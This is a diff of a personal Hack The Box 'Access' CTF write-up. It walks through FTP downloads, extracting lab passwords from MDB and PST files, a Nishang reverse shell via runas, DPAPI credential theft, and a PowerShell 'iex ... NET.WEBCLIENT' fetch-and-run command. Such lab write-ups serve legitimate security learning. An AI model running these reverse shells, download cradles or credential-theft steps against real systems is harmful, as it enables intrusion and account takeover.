@@ -1,22 +1,18 @@
 Box: Windows
 Level: Easy
 ### Index
-1. Box Info 
-2. Initial Nmap Enumeration
-3. Initial Enumeration Observations 
-4. FTP Binary Mode (`binary` Command) to download the file using FTP. Make Sure to use SUDO you dumber.
-5. Microsoft Access Database (MDB) Files. - Extracting Data using [`mdbtools`](https://www.kali.org/tools/mdbtools/)
-6. Extracting Password Protected 7z ZIP file
-	6.1  PST - Personal Storage Table File
-	6.2  MBOX - Mail Box File
-7.  Privilege Escalation
-	7.1  Use Runas to grab the admin shell using Nishang
-	7.2 Use DPAPI Creds
-	7.3  Start PowerShell using Prompt
-	7.4  PowerShell to Print the File Properties (File Property)
-8.  Dumb Mistakes
-9.  Privilege Escalation Using PowerShell
-
+1. [Box Info](#Box%20Info)
+2. [Initial Enumeration](#Initial%20Enumeration)
+	1. [`Initial Enumeration Observations`](#`Initial%20Enumeration%20Observations`)
+	2. [`FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber`](#`FTP%20Binary%20Mode%20to%20download%20the%20file%20using%20FTP.%20Make%20Sure%20to%20use%20SUDO%20you%20dumber`)
+3. [Microsoft Access Database (MDB) Files](#Microsoft%20Access%20Database%20(MDB)%20Files)
+	1. [`Extracting Password Protected 7z ZIP file`](#`Extracting%20Password%20Protected%207z%20ZIP%20file`)
+	2. [`Personal Storage Table (PST) File`](#`Personal%20Storage%20Table%20(PST)%20File`)
+	3. [`Telnet Session as a shell`](#`Telnet%20Session%20as%20a%20shell`)
+4. [`CTF Using RunAs`](#`CTF%20Using%20RunAs`)
+	1. [`CTF Using DPAPI Creds`](#`CTF%20Using%20DPAPI%20Creds`)
+5. [`Dumb Mistakes`](#`Dumb%20Mistakes`)
+6. [`Privilege Escalation Using PowerShell`](#`Privilege%20Escalation%20Using%20PowerShell`)
 ### Box Info
 ```
 Access is an &amp;quot;easy&amp;quot; difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.
@@ -65,8 +61,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp
 
 ```
-
-### Initial Enumeration Observations
+###### `Initial Enumeration Observations`
 
 1. FTP Anonymous Access Allowed but when trying to download the file I see Permission Denied. 
 2.  The Title of the Web Site `LON-MC6`. Upon Googling the Title, I got the following details.
@@ -103,8 +98,7 @@ ftp> dir
 ```
 
 4. The FTP share was also not writable. But I learn an interesting things this time for FTP.
-
-### FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber
+###### `FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber`
 
 So this was an interesting scenario. I will walk you through my dumbness here so you don't make the same mistake. There are things that I don't know but there are things that I know and don't pay attention to it. Classic Example. 
 
@@ -231,9 +225,9 @@ local: Access Control.zip remote: Access Control.zip
 ```
 
 I got both the file. The `backup.mdb` as well as `Access Control.zip`.
-### Microsoft Access Database (MDB) Files
+### `Microsoft Access Database (MDB) Files`
 
-Allright, We have got both `backup.mdb` and `Access Control.zip` file on our machine. The `Access Control.zip` file was a password protected. Upon following the Guided Mode on HTB, the first question was to provide the password for the `Access Contorl.zip` file. So my guess was to extract the password from the `backup.mdb` file. I installed the [mdbtools](https://www.kali.org/tools/mdbtools/) On kali and extract the password as follows. The list of Tables were too long to post and unnecessary but the only one useful table and that was `auth_user`
+All right, We have got both `backup.mdb` and `Access Control.zip` file on our machine. The `Access Control.zip` file was a password protected. Upon following the Guided Mode on HTB, the first question was to provide the password for the `Access Contorl.zip` file. So my guess was to extract the password from the `backup.mdb` file. I installed the [mdbtools](https://www.kali.org/tools/mdbtools/) On kali and extract the password as follows. The list of Tables were too long to post and unnecessary but the only one useful table and that was `auth_user`
 
 Extracting the Table
 ```
@@ -254,7 +248,7 @@ $ mdb-json backup.mdb auth_user
 
 All Right we got the password `access4u@security`. 
 
-### Extracting Password Protected 7z ZIP file
+###### `Extracting Password Protected 7z ZIP file`
 
 Now we will extract the ZIP file using 7z. use **SUDO** 
 ```
@@ -285,7 +279,7 @@ $ ls
 'Access Control.pst'
 ```
 
-##### Personal Storage Table (PST) File
+###### `Personal Storage Table (PST) File`
 
 Okay now we have got the .pst file. Upon using the following command, we can extract the .mbox file.
 ```
@@ -320,20 +314,11 @@ Content-Type: multipart/alternative;
 Content-Type: text/plain; charset="utf-8"
 
 Hi there,
-
- 
-
 The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
-
- 
-
 Regards,
-
 John
 ```
-
-
-### Telnet Session as a shell
+###### `Telnet Session as a shell`
 
 ```
 $ telnet access.htb
@@ -394,7 +379,7 @@ L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Wind
 
 Cool. Now I tune into **Writeup**. We have two options. Use **Runas** along with Nishang Framework and use dpapi creds. I will use both the methods now.
 
-#### CTF Using RunAs
+### `CTF Using RunAs`
 
 Get [Nishang](https://github.com/samratashok/nishang) - For xyz reason, This method was not working when I tried it out. But I saw couple of writeups even the official writeup has this method written in it.
 Change the following line or add the following line at the end of `Invoke-PowerShellTCP.ps1` file. 
@@ -425,7 +410,7 @@ C:\Users\security\Desktop>type root.txt
 df1be53d8a92f245e5fa0fc65b5b4a37
 ```
 
-#### CTF Using DPAPI Creds
+###### `CTF Using DPAPI Creds`
 
 This is the first time I'm trying this method so definitely a learning curve here. We will grab two binary files from the Target. A Master Key and Credential File.
 
@@ -686,9 +671,9 @@ WorkingDirectory : C:\ZKTeco\ZKAccess3.5
 
 Notice that our original `ZKAccess3.5 Security System.lnk` has the actual path `C:\Windows\System32\runas.exe`. 
 
-### Dumb Mistakes
+### `Dumb Mistakes`
 
-Yes, You read that correctly. Dumb people like me always makes dumb mistakes but the inner soul always say that you must have done something wrong. 
+Yes, You read that correctly. Dumb people like me always makes dumb mistakes and the inner soul always say that you must have done something wrong. 
 
 There was a typo in my command. It should be 
 ```
@@ -697,7 +682,7 @@ powershell iex (new.object NET.WEBCLIENT)
 
 and I was using `New.Webclient` the Whole Time. So it worked when I correct my typo error. I was not copy paste the command and making such mistakes. 
 
-### Privilege Escalation Using PowerShell
+### `Privilege Escalation Using PowerShell`
 
 Okay so far, we tried everything using mimikatz. Since the PowerShell is working now (after I realized my dumb mistake), I wanted to cover up the way to get the Admin shell using the PowerShell form the `Security` user account.
 
